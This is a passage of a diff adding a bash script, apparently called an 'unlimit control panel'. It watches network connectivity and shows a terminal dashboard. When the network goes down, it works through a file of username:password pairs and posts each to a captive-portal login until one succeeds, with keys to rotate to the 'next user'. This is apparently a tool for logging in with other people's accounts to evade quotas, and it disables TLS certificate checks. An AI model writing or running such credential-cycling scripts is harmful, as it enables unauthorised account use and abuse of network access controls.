@@ -1,0 +1,141 @@
+
+CYAN="${ESC}[36m"; GREEN="${ESC}[32m"; RED="${ESC}[31m"; MAGENTA="${ESC}[35m"
+
+# ── state ─────────────────────────────────────────────
+STATE="up"
+CURRENT_USER="-"
+STATUS="idle"
+SKIP=0
+STOP=0
+
+# ── terminal setup ────────────────────────────────────
+ORIG_STTY=$(stty -g 2>/dev/null)
+
+cleanup() {
+    stty "$ORIG_STTY" 2>/dev/null
+    printf "${ESC}[?25h"    # show cursor
+    printf "${ESC}[2J${ESC}[H"
+    echo "[auto] exited."
+    exit 0
+}
+trap cleanup INT TERM
+
+# raw mode: no line buffering, no echo, no signals from keys
+stty -echo -icanon min 1 time 0
+printf "${ESC}[?25l"   # hide cursor
+
+log() { echo "[$(date '+%F %T')] $*" >> "$LOG"; }
+
+draw() {
+    printf "${ESC}[2J${ESC}[H"   # clear + home
+    local w=60
+    printf "${CYAN}${BOLD}╭"; printf '─%.0s' $(seq 1 $w); printf "╮${RESET}\n"
+    printf "${CYAN}${BOLD}│${RESET} ${BOLD}unlimit control panel${RESET}%*s${CYAN}${BOLD}│${RESET}\n" $((w-22)) ""
+    printf "${CYAN}${BOLD}├"; printf '─%.0s' $(seq 1 $w); printf "┤${RESET}\n"
+
+    local sc="$GREEN"; [ "$STATE" = "down" ] && sc="$RED"
+    printf "${CYAN}│${RESET} network  : ${sc}${BOLD}%-10s${RESET}%*s${CYAN}│${RESET}\n" \
+        "$(echo "$STATE" | tr a-z A-Z)" $((w-22)) ""
+    printf "${CYAN}│${RESET} user     : ${MAGENTA}%-30s${RESET}%*s${CYAN}│${RESET}\n" "$CURRENT_USER" $((w-42)) ""
+    printf "${CYAN}│${RESET} status   : %-30s%*s${CYAN}│${RESET}\n" "$STATUS" $((w-42)) ""
+
+    printf "${CYAN}${BOLD}├"; printf '─%.0s' $(seq 1 $w); printf "┤${RESET}\n"
+    printf "${CYAN}│${RESET} ${DIM}recent activity${RESET}%*s${CYAN}│${RESET}\n" $((w-17)) ""
+    local i=0
+    while IFS= read -r line; do
+        printf "${CYAN}│${RESET} ${DIM}%-58s${RESET}${CYAN}│${RESET}\n" "${line:0:58}"
+        i=$((i+1))
+    done < <(tail -n 6 "$LOG" 2>/dev/null | sed 's/^\[[^]]*\] //')
+    while [ $i -lt 6 ]; do
+        printf "${CYAN}│${RESET} %-58s ${CYAN}│${RESET}\n" ""
+        i=$((i+1))
+    done
+    printf "${CYAN}${BOLD}├"; printf '─%.0s' $(seq 1 $w); printf "┤${RESET}\n"
+    printf "${CYAN}│${RESET}  ${BOLD}[n]${RESET} next user   ${BOLD}[l]${RESET} logout   ${BOLD}[q]${RESET} quit%*s${CYAN}│${RESET}\n" $((w-44)) ""
+    printf "${CYAN}${BOLD}╰"; printf '─%.0s' $(seq 1 $w); printf "╯${RESET}\n"
+}
+
+try_login() {
+    while IFS=: read -r user pass; do
+        [ "$STOP" -eq 1 ] && return
+        if [ "$SKIP" -eq 1 ]; then
+            SKIP=0
+            log "[control] skipped $user"
+            continue
+        fi
+        [ -z "$user" ] && continue
+
+        STATUS="trying $user"
+        draw
+        log "trying $user ..."
+
+        response=$(curl -k -s --max-time 5 \
+            -d "mode=191&username=${user}&password=${pass}&a=$(date +%s)000&producttype=0" \
+            "$PORTAL")
+
+        if echo "$response" | grep -qiE "success|logged in|already"; then
+            CURRENT_USER="$user"
+            echo "$user" > "$HOME/wifi/.last_user"
+            STATUS="connected"
+            log "✅ CONNECTED as: $user"
+            draw
+            return 0
+        else
+            log "❌ failed: $user"
+        fi
+        sleep 1
+    done < "$CREDS"
+    STATUS="no cred worked"
+    draw
+    return 1
+}
+
+# ── main loop with inline key handling ────────────────
+draw
+
+while [ "$STOP" -eq 0 ]; do
+    # non-blocking read (min 1 time 0 makes it block up to 0s, so use timeout trick)
+    if read -rsn1 -t 0.3 key; then
+        case "$key" in
+            n|N)
+                SKIP=1
+                STATUS="skip requested"
+                log "[control] skip → next user"
+                draw
+                ;;
+            l|L)
+                STATUS="logging out..."
+                draw
+                log "[control] logout requested"
+                "$LOGOUT" >/dev/null 2>&1
+                CURRENT_USER="-"
+                STATUS="offline"
+                draw
+                ;;
+            q|Q)
+                cleanup
+                ;;
+        esac
+    fi
+
+    # network check
+    if ping -c 1 -W 2 "$TARGET" > /dev/null 2>&1; then
+        NEW_STATE="up"
+    else
+        NEW_STATE="down"
+    fi
+
+    if [ "$NEW_STATE" != "$STATE" ]; then
+        STATE="$NEW_STATE"
+        if [ "$STATE" = "down" ]; then
+            log "⚠️  network DOWN"
+            draw
+            try_login
+        else
+            log "✅ network UP"
+            draw
+        fi
+    fi
+done
+
+cleanup
